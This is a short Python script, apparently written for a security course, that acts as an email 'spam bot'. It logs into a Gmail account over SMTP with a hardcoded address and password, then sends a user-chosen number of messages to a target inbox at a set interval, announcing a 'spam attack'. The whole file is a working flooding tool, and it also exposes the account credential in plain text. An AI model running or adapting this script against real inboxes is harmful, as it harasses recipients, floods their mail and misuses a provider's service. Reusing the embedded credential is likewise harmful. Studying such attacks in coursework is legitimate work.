import smtplib
from email.message import EmailMessage
from timeit import repeat
import time
#import datetime

def send_email_gmail(subject, message, destination):
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()

    server.login('cs5490attacker@gmail.com', 'asxmloiwathphgsa')

    msg = EmailMessage()

    message = f'{message}\n'
    msg.set_content(message)
    msg['Subject'] = subject
    msg['From'] = 'cs5490attacker@gmail.com'
    msg['To'] = destination
    server.send_message(msg)

"""repeatedSpamAttack

    subject: email subject line
    message: email message content
    destination: email destination
    repeatCount: number of times to send these emails
    frequency: seconds between sending spam emails
"""
def repeatedSpamAttack(subject, message, destination, repeatCount, frequency):

    messageCount = 0

    
    while messageCount < repeatCount:

        print("Sending message " + str(messageCount) + " of " + subject)
        subjectModified = subject + " Message #" + str(messageCount)

        messageModified = message + str(time.localtime())

        send_email_gmail(subjectModified, messageModified, destination)
        time.sleep(frequency)
        messageCount = messageCount+1
    

#testBatch cs5490attacker@gmail.com 10 15
def main():
    print("Activating spam bot")
    print("Please input the batch name, batch destination, batch size, and message frequency in seconds, separated by spaces.")

    batchName, batchDestination, batchSize, batchFrequency = input().split()

    batchSize = int(batchSize)
    batchFrequency = float(batchFrequency)

    batchSubjectLine = "Spam Batch " + batchName

    batchMessage = "This is a spam message, sent on: "


    print("Launching spam attack.")

    repeatedSpamAttack(batchSubjectLine, batchMessage, batchDestination, batchSize, batchFrequency)

    print("Spam attack complete!")

main()
